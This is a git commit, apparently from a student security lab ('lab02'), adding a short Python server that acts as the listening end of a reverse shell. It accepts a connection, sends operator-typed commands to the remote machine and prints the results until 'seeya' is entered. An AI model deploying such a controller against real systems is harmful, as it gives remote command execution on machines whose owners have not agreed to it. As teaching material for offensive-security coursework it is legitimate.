7d1ed2ad115b889f5a5f0986230aa272ccabd8f3
kralouf <114093052+kralouf@users.noreply.github.com>
2025-03-03 15:05:09 -0600

    lab02

---
+++ lab02/lab02-LK-server.py
@@ -0,0 +1,27 @@
+import socket
+import os
+
+def connecting():
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    ip = input("Please enter the server IP: ")
+    port = int(input("Please enter the port to bind to: "))
+    s.bind((ip,port))
+    print("Waiting for a connection... *cue jeopardy theme*")
+    s.listen(1)
+    connection,address = s.accept()
+    print("We're In! :) Connection established at",address)
+
+    while True:
+        command = input("Shell> ")
+        if "seeya" in command:
+            connection.send("seeya".encode())
+            connection.close()
+            break
+        else:
+            connection.send(command.encode())
+            print(connection.recv(5000).decode())
+
+def main():
+    connecting()
+main()
